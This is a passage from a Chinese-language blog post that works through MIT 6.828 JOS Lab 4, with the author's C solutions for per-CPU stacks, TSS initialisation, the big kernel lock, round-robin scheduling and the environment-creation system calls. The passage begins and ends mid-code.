class="comment">//[IOPHYSMEM, EXTPHYSMEM) is never be allocated --3</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;EXTPHYSMEM/PGSIZE;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[EXTPHYSMEM, ...) --4</span></span><br><span class="line"><span class="comment">//in this part,we need to know which pages has been used for pages-table or page-directory or kernel</span></span><br><span class="line"><span class="keyword">physaddr_t</span> lasted_in_use_address = PADDR(boot_alloc(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">size_t</span> last_number = lasted_in_use_address/PGSIZE;</span><br><span class="line"><span class="keyword">for</span>(;i&lt;last_number;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//other pages for free</span></span><br><span class="line"><span class="keyword">for</span>(;i &lt; npages;i++)&#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们又能看见check_page_free_list() succeeded!了。</p><blockquote><p>Question</p><p>将kern/mpentry.S与boot/boot.S并排比较。 请记住，就像内核中的其他内容一样，kern/mpentry.S被编译、链接并运行在<code>KERNBASE</code>之上，宏MPBOOTPHYS的目的是什么？ 为什么这在在kern/mpentry.S很关键？换句话说，如果在kern/mpentry.S中省略了什么可能会出错？<strong>提示：回忆链接地址与加载地址的区别。</strong></p><p>boot.S中，由于尚没有启用分页机制，所以我们能够指定程序开始执行的地方以及程序加载的地址；但是，在mpentry.S的时候，由于主CPU已经处于保护模式下了，因此是不能直接指定物理地址的，给定线性地址，映射到相应的物理地址是允许的。</p></blockquote><h4 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h4><p>在编写多处理器操作系统时，区分每个处理器私有的CPU状态和整个系统共享的全局状态很重要。kern/cpu.h定义了大多数的per-CPU状态，包括CpuInfo结构体，这个结构体存储了per-CPU的变量。cpunum() 总是返回调用它的CPU的ID，它可以作为cpus数组的索引。thiscpu宏是当前CPU的结构CpuInfo的简写。</p><p>JOS使用CpuInfo结构体来记录CPU的信息：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CpuInfo</span> &#123;</span></span><br><span class="line"><span class="keyword">uint8_t</span> cpu_id;                 <span class="comment">// Local APIC ID; index into cpus[] below</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">unsigned</span> cpu_status;   <span class="comment">// The status of the CPU</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">cpu_env</span>;</span>            <span class="comment">// The currently-running environment.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Taskstate</span> <span class="title">cpu_ts</span>;</span>        <span class="comment">// Used by x86 to find stack for interrupt</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个CPU如下信息是当前CPU私有的：</p><ul><li>内核栈：因为多个CPU可以同时陷入内核，所以我们需要为每个处理器使用单独的内核堆栈，以防止它们被彼此干扰。<code>percpu_kstacks[NCPU][KSTKSIZE]</code>数组为每个CPU都保留了KSTKSIZE大小的内核栈</li><li>TSS和TSS描述符：每个CPU都需要单独的TSS和TSS描述符来指定该CPU对应的内核栈</li><li>进程结构指针：每个CPU都会独立允许一个进程的代码，所以需要Env指针</li><li>系统寄存器：比如cr3，gdt，ltr这些寄存器都是每个CPU私有的，每个CPU都需要单独设置</li></ul><p>到目前为之CpuInfo和Env的关系可以总结如下：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_2_cpu%E5%92%8CEnv%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="Env和CpuInfo关系"></p><p><strong>exercise 3</strong></p><p>处理器同时运行，不能共享一个栈，每个处理器都要有自己的栈。当然，这种区分是在虚拟地址层面上的，不是在物理地址层面上的，不同虚拟地址可以映射到相同物理地址，也可以映射到不同。在这里，我们当然希望能够映射到不同地址上。</p><p>主要工作在函数<code>mem_init_mp</code>，这个函数在<code>mem_init</code>初始化完成<code>BSP</code>使用的栈后调用，为各个<code>AP</code>映射栈地址。</p><p>讲义和代码注释要求我们给每个栈分配<code>KSTKSIZE</code>大小，中间留出<code>KSTKGAP</code>作为保护，使得一个栈溢出一定不会影响相邻的栈。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">mem_init_mp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Map per-CPU stacks starting at KSTACKTOP, for up to &#x27;NCPU&#x27; CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For CPU i, use the physical memory that &#x27;percpu_kstacks[i]&#x27; refers</span></span><br><span class="line"><span class="comment">// to as its kernel stack. CPU i&#x27;s kernel stack grows down from virtual</span></span><br><span class="line"><span class="comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span></span><br><span class="line"><span class="comment">// divided into two pieces, just like the single stack you set up in</span></span><br><span class="line"><span class="comment">// mem_init:</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span></span><br><span class="line"><span class="comment">//          -- backed by physical memory</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span></span><br><span class="line"><span class="comment">//          -- not backed; so if the kernel overflows its stack,</span></span><br><span class="line"><span class="comment">//             it will fault rather than overwrite another CPU&#x27;s stack.</span></span><br><span class="line"><span class="comment">//             Known as a &quot;guard page&quot;.</span></span><br><span class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NCPU; i++) &#123;</span><br><span class="line">boot_map_region(kern_pgdir,KSTACKTOP - KSTKSIZE - i * (KSTKSIZE + KSTKGAP),KSTKSIZE,PADDR(percpu_kstacks[i]),PTE_W);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exercise4</strong></p><p>在文件kern/trap.c中函数trap_init_percpu对BSP的TSS和TSS描述符进行初始化。上一个Lab留下的版本，不能正确的处理多处理器的情况，我们需要更改它，让它能够正确初始化每个AP的中断。在之前的lab中，trap_init_percpu函数在trap_init中调用，trap_init在i386_init中调用，这是给BSP初始化中断。AP内核的入口函数mp_main调用了trap_init_percpu，这是给各个AP初始化中断。在BSP调用的trap_init函数中，<strong>中断描述符表</strong>已经初始化完成了，在各个AP中也就没比要再做，故没有调用trap_init。</p><p>注意此时的代码已经执行在不同的CPU上了，而不是要初始化所有CPU，只需要初始化自身就可以了。用thiscpu-&gt;cpu_ts代替全局变量cpu_ts。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">trap_init_percpu(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The example code here sets up the Task State Segment (TSS) and</span></span><br><span class="line"><span class="comment">// the TSS descriptor for CPU 0. But it is incorrect if we are</span></span><br><span class="line"><span class="comment">// running on other CPUs because each CPU has its own kernel stack.</span></span><br><span class="line"><span class="comment">// Fix the code so that it works for all CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//   - The macro &quot;thiscpu&quot; always refers to the current CPU&#x27;s</span></span><br><span class="line"><span class="comment">//     struct CpuInfo;</span></span><br><span class="line"><span class="comment">//   - The ID of the current CPU is given by cpunum() or</span></span><br><span class="line"><span class="comment">//     thiscpu-&gt;cpu_id;</span></span><br><span class="line"><span class="comment">//   - Use &quot;thiscpu-&gt;cpu_ts&quot; as the TSS for the current CPU,</span></span><br><span class="line"><span class="comment">//     rather than the global &quot;ts&quot; variable;</span></span><br><span class="line"><span class="comment">//   - Use gdt[(GD_TSS0 &gt;&gt; 3) + i] for CPU i&#x27;s TSS descriptor;</span></span><br><span class="line"><span class="comment">//   - You mapped the per-CPU kernel stacks in mem_init_mp()</span></span><br><span class="line"><span class="comment">//   - Initialize cpu_ts.ts_iomb to prevent unauthorized environments</span></span><br><span class="line"><span class="comment">//     from doing IO (0 is not the correct value!)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ltr sets a &#x27;busy&#x27; flag in the TSS selector, so if you</span></span><br><span class="line"><span class="comment">// accidentally load the same TSS on more than one CPU, you&#x27;ll</span></span><br><span class="line"><span class="comment">// get a triple fault.  If you set up an individual CPU&#x27;s TSS</span></span><br><span class="line"><span class="comment">// wrong, you may not get a fault until you try to return from</span></span><br><span class="line"><span class="comment">// user space on that CPU.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="keyword">int</span> cid = thiscpu-&gt;cpu_id;</span><br><span class="line"><span class="comment">// Setup a TSS so that we get the right stack</span></span><br><span class="line"><span class="comment">// when we trap to the kernel.</span></span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - cid * (KSTKSIZE + KSTKGAP);</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(struct Taskstate);</span><br><span class="line"><span class="comment">// Initialize the TSS slot of the gdt.</span></span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>)+cid] = SEG16(STS_T32A, (<span class="keyword">uint32_t</span>) (&amp;(thiscpu-&gt;cpu_ts)),</span><br><span class="line"><span class="keyword">sizeof</span>(struct Taskstate), <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>)+cid].sd_s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the TSS selector (like other segment selectors, the</span></span><br><span class="line"><span class="comment">// bottom three bits are special; we leave them 0)</span></span><br><span class="line">ltr(GD_TSS0+<span class="number">8</span>*cid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the IDT</span></span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><p>目前我们已经有多个CPU同时在执行内核代码了，我们必须要处理竞争条件。最简单粗暴的办法就是使用”big kernel lock”，”big kernel lock”是一个全局锁，进程从用户态进入内核后获取该锁，退出内核释放该锁。这样就能保证只有一个CPU在执行内核代码，但缺点也很明显就是一个CPU在执行内核代码时，另一个CPU如果也想进入内核，就会处于等待的状态。</p><p>锁的数据结构在kern/spinlock.h中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> locked;       <span class="comment">// Is the lock held?</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是一种<strong>spin-locks</strong>。让我们来看看<strong>自旋锁的实现原理</strong>。<br>我们最容易想到的获取自旋锁的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">acquire(struct spinlock *lk)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">     <span class="keyword">if</span>(!lk-&gt;locked) &#123;</span><br><span class="line">         lk-&gt;locked = <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这种实现是有问题的，假设两个CPU同时执行到5行，发现lk-&gt;locked是0，那么会同时获取该锁。问题出在5行和6行是两条指令。</p><p>我们的获取锁，释放锁的操作在kern/spinlock.c中：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">spin_lock(struct spinlock *lk)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The xchg is atomic.</span></span><br><span class="line"><span class="comment">// It also serializes, so that reads after acquire are not</span></span><br><span class="line"><span class="comment">// reordered before it. </span></span><br><span class="line"><span class="keyword">while</span> (xchg(&amp;lk-&gt;locked, <span class="number">1</span>) != <span class="number">0</span>)<span class="comment">//原理见：https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf  chapter 4</span></span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;pause&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">spin_unlock(struct spinlock *lk)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The xchg instruction is atomic (i.e. uses the &quot;lock&quot; prefix) with</span></span><br><span class="line"><span class="comment">// respect to any other instruction which references the same memory.</span></span><br><span class="line"><span class="comment">// x86 CPUs will not reorder loads/stores across locked instructions</span></span><br><span class="line"><span class="comment">// (vol 3, 8.2.2). Because xchg() is implemented using asm volatile,</span></span><br><span class="line"><span class="comment">// gcc will not reorder C statements across the xchg.</span></span><br><span class="line">xchg(&amp;lk-&gt;locked, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span></span><br><span class="line">xchg(<span class="keyword">volatile</span> <span class="keyword">uint32_t</span> *addr, <span class="keyword">uint32_t</span> newval)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> result;</span><br><span class="line">    <span class="comment">// The + in &quot;+m&quot; denotes a read-modify-write operand.</span></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;lock; xchgl %0, %1&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">         : <span class="string">&quot;+m&quot;</span> (*addr), <span class="string">&quot;=a&quot;</span> (result)</span></span></span><br><span class="line"><span class="function"><span class="params">         : <span class="string">&quot;1&quot;</span> (newval)</span></span></span><br><span class="line"><span class="function"><span class="params">         : <span class="string">&quot;cc&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于spin_lock()获取锁的操作，使用xchgl这个原子指令，xchg()封装了该指令，交换lk-&gt;locked和1的值，并将lk-locked原来的值返回。如果lk-locked原来的值不等于0，说明该锁已经被别的CPU申请了，继续执行while循环吧。因为这里使用的xchgl指令，从addr指向的位置读数据保存到result，然后将newval写到该位置，但是原子的，相当于之前25和26行的结合，所以也就不会出现上述的问题。对于spin_unlock()释放锁的操作，直接将lk-&gt;locked置为0，表明我已经用完了，这个锁可以被别人获取了。</p><p>有了获取锁和释放锁的函数，我们看下哪些地方需要加锁，和释放锁：</p><ol><li>i386_init()中，BSP唤醒其它AP前需要获取内核锁。</li><li>mp_main()中，AP需要在执行sched_yield()前获取内核锁。</li><li>trap()中，需要获取内核锁，因为这是用户态进入内核的唯一入口。</li><li>env_run()中，需要释放内核锁，因为该函数使用iret指令，从内核返回用户态。</li></ol><p>这些添加我们就不放代码了，但是它们的意义值得思考。i386_init, mp_main函数的lock都发生在初始化完成，准备通过sched_yield进入用户进程之前。这时候加锁，让处理器依次加载用户进程，保证同一时刻只有一个处理器在内核态运行。</p><p>其它操作内核锁发生在进入和退出内核态的时候。处理器进入内核态后处在函数trap，故在trap开头加锁，等待其它处理器退出内核态。处理器要进入用户态时放开锁，也就是在env_run的最后，允许其它处理器进入内核态。</p><blockquote><p>Question</p><p>big kernel lock似乎已经确保每次仅仅一个CPU能允许内核代码，为什么我们仍然需要为每个CPU设定一个内核栈</p><p>因为在alltraps到lock_kernel()的过程中，进程已经切换到了内核态，但并没有上内核锁，此时如果有其他CPU进入内核，如果用同一个内核栈，则_alltraps中保存的上下文信息会被破坏，所以即使有大内核栈，CPU也不能用用同一个内核栈。同样的，解锁也是在内核态内解锁，在解锁到真正返回用户态这段过程中，也存在上述这种情况</p></blockquote><h3 id="Round-Robin-Scheduling"><a href="#Round-Robin-Scheduling" class="headerlink" title="Round-Robin Scheduling"></a>Round-Robin Scheduling</h3><p>现要JOS内核需要让CPU能在进程之间切换。目前先实现一个非抢占式的进程调度，需要当前进程主动让出CPU，其他进程才有机会在当前CPU运行。具体实现如下：</p><ol><li>实现sched_yield()，该函数选择一个新的进程运行，从当前正在运行进程对应的Env结构下一个位置开始循环搜索envs数组，找到第一个cpu_status为ENV_RUNNABLE的Env结构，然后调用env_run()在当前CPU运行这个新的进程。</li><li>我们需要实现一个新的系统调用sys_yield()，使得用户程序能在用户态通知内核，当前进程希望主动让出CPU给另一个进程。</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">sched_yield(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">idle</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Implement simple round-robin scheduling.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Search through &#x27;envs&#x27; for an ENV_RUNNABLE environment in</span></span><br><span class="line"><span class="comment">// circular fashion starting just after the env this CPU was</span></span><br><span class="line"><span class="comment">// last running.  Switch to the first such environment found.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If no envs are runnable, but the environment previously</span></span><br><span class="line"><span class="comment">// running on this CPU is still ENV_RUNNING, it&#x27;s okay to</span></span><br><span class="line"><span class="comment">// choose that environment.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Never choose an environment that&#x27;s currently running on</span></span><br><span class="line"><span class="comment">// another CPU (env_status == ENV_RUNNING). If there are</span></span><br><span class="line"><span class="comment">// no runnable environments, simply drop through to the code</span></span><br><span class="line"><span class="comment">// below to halt the cpu.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">size_t</span> start = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">if</span>(curenv)&#123;</span><br><span class="line">start = ENVX(curenv-&gt;env_id) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; NENV; i++)&#123;</span><br><span class="line">j = (start + i) % NENV;</span><br><span class="line"><span class="keyword">if</span>(envs[j].env_status == ENV_RUNNABLE)&#123;</span><br><span class="line">env_run(&amp;envs[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(curenv &amp;&amp; curenv-&gt;env_status == ENV_RUNNING)&#123;</span><br><span class="line">env_run(curenv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// sched_halt never returns</span></span><br><span class="line">sched_halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，当前CPU在envs数组中找了一圈后没找到合适的Env去执行，需要重新执行之前运行的进程，否则当前CPU就会进入停机状态。</p><blockquote><p>关于Question3、4</p><p>在函数env_run中通过lcr3切换了页表之后，后面的代码依旧可以访问envs数组的成员。这是因为envs在kern_pgdir中被设置为用户态只读，而我们后面的每个用户进程的页表都是通过kern_pgdir为模板来复刻出来的，除了自身的部分，内核的部分肯定都是一样的，也就可以读取这段地址了</p></blockquote><h3 id="System-Calls-for-Environment-Creation"><a href="#System-Calls-for-Environment-Creation" class="headerlink" title="System Calls for Environment Creation"></a>System Calls for Environment Creation</h3><p>尽管现在的内核有能力在多进程之间切换，但是仅限于内核创建的用户进程。目前的JOS还没有提供系统调用，使用户进程能够创建新的进程。</p><p>UNIX提供fork()系统调用来创建新进程，fork()拷贝父进程的地址空间和寄存器状态到子进程。父进程从fork()返回的是子进程的进程ID，而子进程从fork()返回的是0。</p><p>我们将实现一组不同的、更原始的JOS系统调用来创建新的用户模式环境。我们需要完成如下函数：</p><ol><li>sys_exofork()：<br>创建一个新的进程，用户地址空间没有映射，不能运行，寄存器状态和父环境一致。在父进程中sys_exofork()返回新进程的envid，子进程返回0。</li><li>sys_env_set_status：设置一个特定进程的状态为ENV_RUNNABLE或ENV_NOT_RUNNABLE。</li><li>sys_page_alloc：为特定进程分配一个物理页，映射指定线性地址va到该物理页。</li><li>sys_page_map：拷贝页表，使指定进程共享当前进程相同的映射关系。本质上是修改特定进程的页目录和页表。</li><li>sys_page_unmap：解除页映射关系。本质上是修改指定用户环境的页目录和页表。</li></ol><p><strong>exercise7</strong></p><p>实现上述的系统调用</p><p>首先是sys_exofork函数，这个函数其实就是env_alloc函数的封装，就是创建一个空白进程，非常简单</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">envid_t</span></span><br><span class="line">sys_exofork(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Create the new environment with env_alloc(), from kern/env.c.</span></span><br><span class="line"><span class="comment">// It should be left as env_alloc created it, except that</span></span><br><span class="line"><span class="comment">// status is set to ENV_NOT_RUNNABLE, and the register set is copied</span></span><br><span class="line"><span class="comment">// from the current environment -- but tweaked so sys_exofork</span></span><br><span class="line"><span class="comment">// will appear to return 0.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_exofork not implemented&quot;);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = env_alloc(&amp;e,curenv-&gt;env_id);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">e-&gt;env_tf = curenv-&gt;env_tf;<span class="comment">//寄存器状态一致</span></span><br><span class="line">e-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">e-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;<span class="comment">//子进程返回0</span></span><br><span class="line"><span class="keyword">return</span> e-&gt;env_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是sys_env_set_status函数。要使得进程从sys_exofork创建得到的状态ENV_NOT_RUNNABLE变为别的状态，也需要一个系统调用来实现。这个系统调用就是对设置Env状态的改变。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_env_set_status(<span class="keyword">envid_t</span> envid, <span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: Use the &#x27;envid2env&#x27; function from kern/env.c to translate an</span></span><br><span class="line"><span class="comment">// envid to a struct Env.</span></span><br><span class="line"><span class="comment">// You should set envid2env&#x27;s third argument to 1, which will</span></span><br><span class="line"><span class="comment">// check whether the current environment has permission to set</span></span><br><span class="line"><span class="comment">// envid&#x27;s status.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_env_set_status not implemented&quot;);</span></span><br><span class="line"><span class="keyword">switch</span> (status)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ENV_NOT_RUNNABLE:</span><br><span class="line"><span class="keyword">case</span> ENV_RUNNABLE:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = envid2env(envid, &amp;e, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">e-&gt;env_status = status;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是sys_page_alloc通过分配器拿到一些page，然后把他们映射进程的地址空间。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_page_alloc(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: This function is a wrapper around page_alloc() and</span></span><br><span class="line"><span class="comment">//   page_insert() from kern/pmap.c.</span></span><br><span class="line"><span class="comment">//   Most of the new code you write should be to check the</span></span><br><span class="line"><span class="comment">//   parameters for correctness.</span></span><br><span class="line"><span class="comment">//   If page_insert() fails, remember to free the page you</span></span><br><span class="line"><span class="comment">//   allocated!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_page_alloc not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line">ret = envid2env(envid,&amp;e,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((va &gt;= (<span class="keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;<span class="comment">//一系列判定</span></span><br><span class="line"><span class="keyword">int</span> flag = PTE_U | PTE_P;</span><br><span class="line"><span class="keyword">if</span> ((perm &amp; flag) != flag) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span> =</span> page_alloc(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(pp == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br><span class="line">ret = page_insert(e-&gt;env_pgdir,pp,va,perm);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">page_free(pp);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sys_page_map</code>将一个进程的<code>Page Directory</code>拷贝给另一个进程，让另一个进程获得相同的<strong>地址空间</strong>。这是对<code>page_insert</code>的封装。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_page_map(<span class="keyword">envid_t</span> srcenvid, <span class="keyword">void</span> *srcva,</span><br><span class="line">     <span class="keyword">envid_t</span> dstenvid, <span class="keyword">void</span> *dstva, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: This function is a wrapper around page_lookup() and</span></span><br><span class="line"><span class="comment">//   page_insert() from kern/pmap.c.</span></span><br><span class="line"><span class="comment">//   Again, most of the new code you write should be to check the</span></span><br><span class="line"><span class="comment">//   parameters for correctness.</span></span><br><span class="line"><span class="comment">//   Use the third argument to page_lookup() to</span></span><br><span class="line"><span class="comment">//   check the current permissions on the page.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_page_map not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">srce</span>,*<span class="title">dste</span>;</span></span><br><span class="line">ret = envid2env(srcenvid,&amp;srce,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || srce == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ret = envid2env(dstenvid,&amp;dste,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || dste == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (srcva &gt;= (<span class="keyword">void</span>*)UTOP || dstva &gt;= (<span class="keyword">void</span>*)UTOP || ROUNDDOWN(srcva,PGSIZE) != srcva || ROUNDDOWN(dstva,PGSIZE) != dstva) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> flag = 